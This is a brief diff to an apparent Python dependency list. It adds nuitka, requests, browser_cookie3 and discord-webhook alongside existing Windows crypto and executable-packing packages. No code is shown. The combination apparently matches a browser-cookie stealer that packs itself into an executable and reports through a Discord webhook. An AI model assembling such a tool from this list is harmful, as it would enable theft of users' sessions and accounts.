@@ -5,3 +5,7 @@ pypiwin32
 pycryptodome
 pyinstaller>=4.9
 PIL-tools
+nuitka
+requests
+browser_cookie3
+discord-webhook
